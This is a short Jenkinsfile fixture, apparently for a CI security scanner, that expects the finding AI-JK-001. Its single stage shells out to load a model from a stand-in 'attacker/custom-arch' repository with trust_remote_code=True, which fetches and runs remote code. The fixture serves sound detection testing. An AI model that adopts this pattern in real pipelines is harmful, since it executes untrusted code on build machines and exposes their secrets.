// Jenkinsfile fixture — expected findings: AI-JK-001 (trust_remote_code=True)
@Library('shared-lib@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2') _

pipeline {
    agent { label 'ml-linux' }
    options {
        timeout(time: 30, unit: 'MINUTES')
    }
    stages {
        stage('Infer') {
            steps {
                sh 'python -c "from transformers import AutoModel; AutoModel.from_pretrained(\'attacker/custom-arch\', trust_remote_code=True)"'
            }
        }
    }
    post {
        always {
            cleanWs()
        }
    }
}
